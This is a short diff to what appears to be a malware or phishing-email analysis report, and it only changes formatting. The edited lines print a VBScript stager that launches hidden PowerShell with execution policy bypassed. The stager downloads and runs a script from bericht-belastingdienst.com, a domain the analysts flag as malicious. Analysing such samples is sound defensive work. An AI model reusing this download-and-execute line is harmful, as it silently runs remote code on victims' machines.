@@ -28,8 +28,8 @@ During the analysis of the email, we identified the user who sent the email and 
 
 We obtained this output:
 
-`Set objShell = CreateObject("WScript.Shell")
-`objShell.Run "cmd.exe /c powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command iex (New-Object Net.WebClient).DownloadString('http://bericht-belastingdienst.com/good_news.vbs')", 0, False`
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd.exe /c powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command iex (New-Object Net.WebClient).DownloadString('http://bericht-belastingdienst.com/good_news.vbs')", 0, False
 
 1. When checking the reputation of the domain bericht-belastingdienst.com, we found it to be very malicious.
 
